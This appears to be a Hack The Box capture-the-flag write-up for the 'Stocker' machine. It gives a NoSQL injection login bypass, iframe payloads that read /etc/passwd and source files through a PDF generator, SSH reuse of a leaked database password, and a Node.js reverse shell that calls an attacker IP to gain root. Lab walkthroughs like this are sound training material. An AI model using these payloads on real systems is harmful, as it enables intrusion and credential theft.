# Stocker HTB machine

**A machine with a subdomain web service that creates and displays orders, which is vulnerable to NoSQL and SSRF attacks.**

First of all, we should add the ip of the machine into the hosts folder. This is sometimes needed for the DNS resolution.

- Go to etc/hosts and add the line "10.10.11.196 stocker.htb". Save the file and open your vpn document with "openvpn name_of_vpn_document" from the terminal.

- After exploring the web page, we do not find an entry point. We can start scanning the websites for new files, but there is nothing interesting there either. Let's do wordlist scanning for subdomains, using gobuster:

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
```

We find out that "dev" is a subdomain of "stocker". So, let's check the website "dev.stocker.htb". First, we see a login form. Trying different usernames and passwords does not get us anywhere. SQLI does not work either. Let's open burpsuite to automate our interaction with the browser. We can try NoSQL injection and see whether it bypasses the authentication or not. 

This article explains how to perform noSQLI:

https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass

We can try basic JSON authentication bypass using not equal ($ne). The $ne property with some random value, basically structures the query to search for usernames/passwords which are NOT EQUAL to our random values.

Change the content type to "application/json" and substitute the data payload of the request in burpsuite, with the following lines:

```
{"username":{"$ne":null}, "password":{"$ne":null}}
```

And.. we got in! We are being redirected to a website, where we can put items in the cart and make an order. Then, we can view the order through a pdf file. Downloading and examinating the pdf file using "exiftool" will produce interesting metadata about the file. Using the exiftool command, we see "Producer : Skia/PDF m108". So, the PDF is generated via some kind of Chromium web-browser based bot. So, we the application was created by Chromium using the Skia/PDF m108 graphics library. This indicates that the application is utilising Headless Chrome version 108 to render and convert the dashboard pages, potentially allowing the execution of JavaScript code. The next step is to attempt to trigger the execution of XSS payloads within the headless browser used by the PDF generation service.

This article explains the vulnerability and the exploit:

https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file

We can try substituting the string value of "Title" to the following command:

```
<iframe src=/etc/passwd height=1000 width=1000></iframe>
```

If we check the pdf generated, we will see the contents of the /etc/passwd file. 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```


The successful execution of our XSS payload implied that we had some control over a browser located inside the organisation's internal network. As such, we could manipulate the browser to request arbitrary restricted resources which would be unreachable by outside users. This is known as a Server-Side Request Forgery (SSRF) attack.

Let's see more information about the configurations of the machine. Add the following line to the "Title" value:

```
<iframe src=file:///etc/nginx/nginx.conf height=1000 width=1000></iframe>
```

We now from the contents of the configuration file, that 'dev.stocker.htb' operates from '/var/www/dev/'. Since this vulnerability does not give us RCE access next step is to find a password for the users. Using prior knowledge of NodeJS naming schemes, we can try 'app,main,index+.js' . The 'index.js' exists. 

Add the following line to the "Title" value:
```
<iframe src=file:///var/www/dev/index.js height=1000 width=1000></iframe>
```

In the pdf file produced, we can see the following line:

```
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

So, since we know from the "/etc/passwd" file that the user "angoose" exists, let's try doing ssh and providing the password found in the "index.js" file.

Execute the following command:

```
ssh angoose@stocker.htb
```

Providing the password "IHeardPassphrasesArePrettySecure" will get us in.

Now, we can get the "user.txt" flag. We can now look for ways to do privilege escalation. We can try "sudo -l" to see the privileges of the "angoose" user.

```
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

So, that means that the user "angoose" has privileges to execute ".js" scripts. Let's make a script that will establish a reverse shell connection with our computer(make sure to place the appropriate ip and port values). Create the following script under the "angoose" user folder:

```
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.10.16.31", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
```

Now, open a connection in your terminal using "nc -lvpn 4444". Then, run the script from the ssh connection:

```
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/script.js
```

Hopefully, after executing the command, you will be able to see that you have established connection as a "root" user. You can navigate to "/root" and get the "flag.txt" flag.
